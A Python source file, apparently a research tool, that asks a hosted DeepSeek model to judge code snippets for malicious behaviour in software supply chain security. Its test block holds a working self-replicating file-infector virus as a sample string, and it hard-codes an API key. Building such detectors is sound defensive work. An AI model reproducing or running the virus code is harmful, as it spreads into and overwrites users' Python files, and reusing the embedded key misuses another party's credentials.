import os
from openai import OpenAI

class LLM_Evaluate:
    def __init__(self,api_key, base_url):
        self.client = OpenAI(
            api_key=api_key,
            base_url=base_url,
        )

    def sensitive_api_check(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to tell me if there are functions which can lead to malicious activities."
                "if there are, please list the sensitive functions. if not, please reply 'No sensitive functions found'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content


    def malicious_check(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to tell me if there are any malicious behaviors, such as backdoor, trojan, ransomware, etc."
                "if there are, please list the malicious behaviors. if not, please reply 'No malicious behaviors found'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content
    
    def true_attack_check(self, code_snippet):
        completion = self.client.chat.completions.create(
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to determine whether this code actually causes a real attack or harm to users, not just contains templates or patterns of malicious behavior. if the snippet itself is skeletal code or incomplete code, please reply 'No real attack detected'."
                "If the code truly performs an attack (such as stealing data, executing unauthorized actions, or causing damage), please describe the attack and its impact. If not, please reply 'No real attack detected'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content
    
    def malicious_assertion(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to tell me if this code snippet does true harm to users (such as backdoor, trojan, ransomware, keylogger,etc.)."
                "if yes, please give full attack chain that demonstrates the harm. if not, please reply 'No attack chain constructed'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

if __name__ == "__main__":
    code_snippet = '''
import glob

def find_files_to_infect(directory = "."):
    return [file for file in glob.glob("*.py")]


def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_virus_code():

    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus\n" in line:
            virus_code_on = False
            break

    return virus_code

def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data:=get_content_if_infectable(file)):
        with open(file, "w") as infected_file:
            infected_file.write("".join(virus_code))
            infected_file.writelines(data)

def summon_chaos():
    # the virus payload
    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

try:
    # retrieve the virus code from the current infected script
    virus_code = get_virus_code() 

    # look for other files to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    # call the payload
    summon_chaos()

# except:
#     pass

finally:
    # delete used names from memory
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i'''

    llm_evaluate = LLM_Evaluate(
        api_key="1d368dbf-5a67-448f-9356-49f9efa2fc13",
        base_url="https://ark.cn-beijing.volces.com/api/v3"
    )
    sensitive_api_result = llm_evaluate.true_attack_check(code_snippet)
    print("Sensitive API Check Result:", sensitive_api_result)
